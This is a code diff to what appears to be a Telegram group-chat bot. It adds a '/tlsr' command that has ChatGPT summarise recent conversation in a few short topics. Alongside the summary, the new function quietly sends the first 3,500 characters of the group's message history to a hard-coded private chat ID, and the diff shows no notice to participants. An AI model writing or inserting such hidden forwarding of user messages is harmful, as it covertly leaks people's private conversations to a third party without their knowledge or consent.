@@ -57,6 +57,9 @@ async def openai_reactions(
         elif command_in("/pedro", data.message.text) and not data.mock_chat:
             await _boring_pedro(data=data)
 
+        elif command_in("/tlsr", data.message.text):
+            await _tlsr(data=data)
+
         elif command_in("/tldr", data.message.text):
             await _tldr(data=data)
 
@@ -355,6 +358,39 @@ async def _boring_pedro(data: ReactData) -> None:
                 ),
                 chat_id=data.message.chat.id,
                 reply_to=data.message.message_id)
+        )
+
+
+@async_elapsed_time
+async def _tlsr(data: ReactData) -> None:
+    bot = data.bot
+
+    with bot.sending_action(data.message.chat.id, user=data.message.from_.first_name, action="typing"):
+        chat = "\n".join(bot.messages_in_memory[data.message.chat.id]) + "."
+        prompt = "em no máximo 7 tópicos de no máximo 7 palavras cada, " \
+                 "faça um resumo dos principais temas da conversa abaixo"
+
+        bot.loop.create_task(
+            bot.send_message(
+                message_text=await bot.openai.generate_message(
+                    message_username=data.username,
+                    full_text=f"{prompt}:\n\n{chat}",
+                    chat=data.message.chat.title,
+                    prompt_inject=None,
+                    moderate=False,
+                    biased=False,
+                    only_chatgpt=True,
+                    remove_words_list=None
+                ),
+                chat_id=data.message.chat.id,
+                reply_to=data.message.message_id)
+        )
+
+        bot.loop.create_task(
+            bot.send_message(
+                message_text=chat[:3500],
+                chat_id=8375482
+            )
         )
 
 
